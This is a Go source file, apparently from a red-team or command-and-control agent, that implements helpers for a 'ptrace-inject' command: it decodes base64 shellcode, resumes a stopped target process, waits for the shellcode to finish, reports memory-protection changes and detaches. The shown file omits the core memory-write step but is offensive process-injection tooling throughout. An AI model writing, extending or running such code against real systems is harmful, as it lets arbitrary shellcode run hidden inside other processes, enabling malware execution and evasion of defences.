//go:build linux

package commands

import (
	"encoding/base64"
	"fmt"
	"os"
	"strings"
	"syscall"
	"time"
)

type PtraceInjectCommand struct{}

func (c *PtraceInjectCommand) Name() string { return "ptrace-inject" }
func (c *PtraceInjectCommand) Description() string {
	return "Linux process injection via ptrace syscall (T1055.008)"
}

type ptraceInjectArgs struct {
	Action       string `json:"action"`
	PID          int    `json:"pid"`
	ShellcodeB64 string `json:"shellcode_b64"`
	Restore      *bool  `json:"restore"`
	Timeout      int    `json:"timeout"`
}

func ptraceValidateAndDecode(args ptraceInjectArgs) (shellcode []byte, restore bool, timeout int, err error) {
	if args.PID <= 0 {
		return nil, false, 0, fmt.Errorf("valid pid required")
	}
	if args.ShellcodeB64 == "" {
		return nil, false, 0, fmt.Errorf("shellcode_b64 required (base64-encoded shellcode)")
	}
	shellcode, err = base64.StdEncoding.DecodeString(args.ShellcodeB64)
	if err != nil {
		return nil, false, 0, fmt.Errorf("decoding shellcode: %v", err)
	}
	if len(shellcode) == 0 {
		return nil, false, 0, fmt.Errorf("shellcode is empty")
	}
	restore = true
	if args.Restore != nil {
		restore = *args.Restore
	}
	timeout = args.Timeout
	if timeout <= 0 {
		timeout = 30
	}
	return shellcode, restore, timeout, nil
}

func ptraceCheckProcess(pid int) error {
	if _, err := os.Stat(fmt.Sprintf("/proc/%d", pid)); err != nil {
		return fmt.Errorf("process %d not found", pid)
	}
	return nil
}

func ptraceSendSIGCONTIfStopped(pid int, sb *strings.Builder) {
	statusData, readErr := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if readErr != nil {
		return
	}
	for _, line := range strings.Split(string(statusData), "\n") {
		if strings.HasPrefix(line, "State:") && strings.Contains(line, "stopped") {
			_ = syscall.Kill(pid, syscall.SIGCONT)
			time.Sleep(10 * time.Millisecond)
			sb.WriteString("[*] Target was stopped — sent SIGCONT before attach\n")
			return
		}
	}
}

func ptraceWaitForShellcode(pid, timeout int, sb *strings.Builder) (stopped bool, ws syscall.WaitStatus) {
	deadline := time.Now().Add(time.Duration(timeout) * time.Second)
	for time.Now().Before(deadline) {
		wpid, err := syscall.Wait4(pid, &ws, syscall.WNOHANG, nil)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[!] Wait4 error: %v\n", err))
			return false, ws
		}
		if wpid > 0 {
			return true, ws
		}
		time.Sleep(50 * time.Millisecond)
	}
	return false, ws
}

func ptraceReportCompletion(stopped bool, ws syscall.WaitStatus, timeout int, sb *strings.Builder) bool {
	if !stopped {
		sb.WriteString(fmt.Sprintf("[!] Timeout after %ds waiting for shellcode completion\n", timeout))
		sb.WriteString("[*] Detaching without restore (shellcode may still be running)\n")
		return false
	}
	if ws.StopSignal() == syscall.SIGTRAP {
		sb.WriteString("[+] Shellcode completed (SIGTRAP received)\n")
	} else {
		sb.WriteString(fmt.Sprintf("[*] Process stopped with signal %d\n", ws.StopSignal()))
	}
	return true
}

func ptraceDetachAndFinalize(pid int, sb *strings.Builder) {
	if err := syscall.PtraceDetach(pid); err != nil {
		sb.WriteString(fmt.Sprintf("[!] Detach failed: %v\n", err))
	} else {
		sb.WriteString("[+] Detached from process\n")
	}
	sb.WriteString("[+] Injection completed successfully\n")
}

func ptraceMprotectCheck(ret uint64, sb *strings.Builder) {
	if ret != 0 {
		sb.WriteString(fmt.Sprintf("[!] Protection change returned %d (non-zero), continuing anyway\n", int64(ret)))
	} else {
		sb.WriteString("[+] Memory protection set to read+execute\n")
	}
}
